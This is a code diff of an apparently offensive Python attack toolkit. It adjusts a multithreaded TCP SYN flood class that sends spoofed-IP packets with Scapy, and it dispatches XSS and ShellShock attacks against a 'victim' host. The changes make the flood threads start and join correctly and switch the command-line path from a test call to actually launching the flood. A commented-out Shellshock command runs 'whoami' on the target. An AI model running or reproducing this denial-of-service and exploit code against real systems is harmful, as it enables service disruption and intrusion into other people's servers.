@@ -31,8 +31,10 @@ class DOS():
     def tcp_syn_flood(self, start=30000, length=30000, fake_ip = True):
         pool = self.createFloodPool(start, length, 100, self.__tcp_syn_flood, fake_ip, arguments = {})
 
+        print "Starting flooding..."
         for t in pool: t.start()      # Starting threads
         for t in pool: t.join()       # Joining threads
+        print "Ending flooding."
 
     def createFloodPool(self, flood_port_start, flood_port_len, flood_port_step, funct, fake_ip, arguments = {}):
         pool = []
@@ -44,7 +46,6 @@ class DOS():
 
             t = threading.Thread(target=funct, name="flood-" + str(port), kwargs=arg)
             pool.append(t)
-            t.start()
 
         return pool
 
@@ -54,13 +55,7 @@ class DOS():
 
         syn = ip / TCP(dport=self.port, sport=(start, end), flags='S')
         send(syn, verbose=0)
-        # for port in range(start, end):
-        #     if fa syn = ip / TCP(dport=self.port, sport=port, flags='S')
-        #     else: syn = ip / TCP(dport=self.port, sport=port, flags='S')
-        #     send(syn, verbose=0)
-        print "Sent ", end - start, " with IP " + fake_ip if fake_ip else 'with local IP'
-
-# class Attack():
+        # print "Sent ", end - start, " with IP " + fake_ip if fake_ip else 'with local IP'
 
 class HTTP(object):
     """
@@ -408,16 +403,16 @@ if __name__ == "__main__":
         attack = XSS(host, page, args.cookie)
         attack.run(args.fieldname, dict([i.split('=') for i in args.fieldvalue]))
 
-    elif args.shellshock:
+    if args.shellshock:
         victim = ShellShock(host, page)
         victim.test()
         # if victim.test():
         #     victim.run("echo; whoami")
         #     print victim.get["cgi-bin/test.sh"]['data']
 
-    elif args.tcp_syn_flood:
+    if args.tcp_syn_flood:
         victim = DOS(host, args.port)
-        victim.test()
+        victim.tcp_syn_flood()
 
 
 
